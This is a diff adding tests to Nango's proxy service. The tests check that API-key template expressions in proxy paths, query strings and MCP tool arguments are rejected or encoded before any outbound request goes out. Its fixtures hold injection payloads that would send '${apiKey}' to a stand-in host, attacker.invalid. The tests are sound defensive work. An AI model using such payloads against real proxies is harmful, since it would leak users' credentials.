@@ -6,6 +6,8 @@ import { logContextGetter } from '@nangohq/logs';
 import * as shared from '@nangohq/shared';
 import { Err, metrics, Ok } from '@nangohq/utils';
 
+import { proxyRequestTool } from '../controllers/mcp/proxy/request.js';
+import { PublicMcpError } from '../controllers/mcp/utils.js';
 import { capping } from '../utils/usage.js';
 import proxyService from './proxy.service.js';
 
@@ -37,6 +39,84 @@ describe('proxyService', () => {
         vi.mocked(logCtx.error).mockClear();
         vi.mocked(logCtx.failed).mockClear();
         vi.mocked(logCtx.success).mockClear();
+    });
+
+    it.each(['/users/${apiKey}', '/users?secret=${apiKey}', '/${missing}||https://attacker.invalid/${apiKey}'])(
+        'rejects caller-controlled HTTP proxy templates before making an outbound request: %s',
+        async (endpoint) => {
+            const connection = connectionFixture();
+            vi.spyOn(shared.configService, 'getProviderConfig').mockResolvedValue(integrationFixture());
+            vi.spyOn(shared.connectionService, 'getConnection').mockResolvedValue({ success: true, error: null, response: connection });
+            vi.spyOn(shared, 'refreshOrTestCredentials').mockResolvedValue(Ok(connection));
+            const httpCall = vi.spyOn(shared.ProxyRequest.prototype, 'httpCall').mockResolvedValue(axiosResponse(200, {}, '{}'));
+
+            const execution = await proxyService.request({
+                account: accountFixture(),
+                environment: environmentFixture(),
+                plan: null,
+                method: 'GET',
+                endpoint,
+                integrationId: 'github',
+                connectionId: 'connection-id'
+            });
+
+            expect(execution.result.isErr()).toBe(true);
+            if (execution.result.isErr()) {
+                expect(execution.result.error).toMatchObject({ code: 'proxy_request_failed', providerCode: 'invalid_proxy_url', status: 400 });
+                expect(execution.result.error.message).not.toContain('secret');
+            }
+            expect(httpCall).not.toHaveBeenCalled();
+        }
+    );
+
+    it.each([
+        { path: '/users/${apiKey}' },
+        { path: '/users?secret=${apiKey}' },
+        { path: '/${missing}||https://attacker.invalid/${apiKey}' },
+        { path: '/users', base_url_override: 'https://attacker.invalid?secret=${apiKey}' }
+    ])('rejects caller-controlled MCP proxy templates before making an outbound request: %j', async (args) => {
+        const connection = connectionFixture();
+        vi.spyOn(shared.configService, 'getProviderConfig').mockResolvedValue(integrationFixture());
+        vi.spyOn(shared.connectionService, 'getConnection').mockResolvedValue({ success: true, error: null, response: connection });
+        vi.spyOn(shared, 'refreshOrTestCredentials').mockResolvedValue(Ok(connection));
+        const httpCall = vi.spyOn(shared.ProxyRequest.prototype, 'httpCall').mockResolvedValue(axiosResponse(200, {}, '{}'));
+
+        const result = await proxyRequestTool.handler(
+            { method: 'GET', integration_id: 'github', connection_id: 'connection-id', ...args },
+            { account: accountFixture(), environment: environmentFixture(), plan: null, grantedScopes: ['environment:proxy'] }
+        );
+
+        expect(result.isErr()).toBe(true);
+        if (result.isErr()) {
+            expect(result.error).toBeInstanceOf(PublicMcpError);
+            expect(result.error.message).toContain('template expressions');
+            expect(result.error.message).not.toContain('secret');
+        }
+        expect(httpCall).not.toHaveBeenCalled();
+    });
+
+    it('keeps template expressions in MCP query parameters as encoded literal data', async () => {
+        const connection = connectionFixture();
+        vi.spyOn(shared.configService, 'getProviderConfig').mockResolvedValue(integrationFixture());
+        vi.spyOn(shared.connectionService, 'getConnection').mockResolvedValue({ success: true, error: null, response: connection });
+        vi.spyOn(shared, 'refreshOrTestCredentials').mockResolvedValue(Ok(connection));
+        const httpCall = vi.spyOn(shared.ProxyRequest.prototype, 'httpCall').mockResolvedValue(axiosResponse(200, {}, '{}'));
+
+        const result = await proxyRequestTool.handler(
+            {
+                method: 'GET',
+                integration_id: 'github',
+                connection_id: 'connection-id',
+                path: '/users',
+                query_params: { expression: '${apiKey}||https://attacker.invalid' }
+            },
+            { account: accountFixture(), environment: environmentFixture(), plan: null, grantedScopes: ['environment:proxy'] }
+        );
+
+        expect(result.isOk()).toBe(true);
+        expect(httpCall).toHaveBeenCalledExactlyOnceWith(
+            expect.objectContaining({ url: 'https://api.github.com/users?expression=%24%7BapiKey%7D%7C%7Chttps%3A%2F%2Fattacker.invalid' })
+        );
     });
 
     it('executes a provider request and returns transport-neutral response data', async () => {
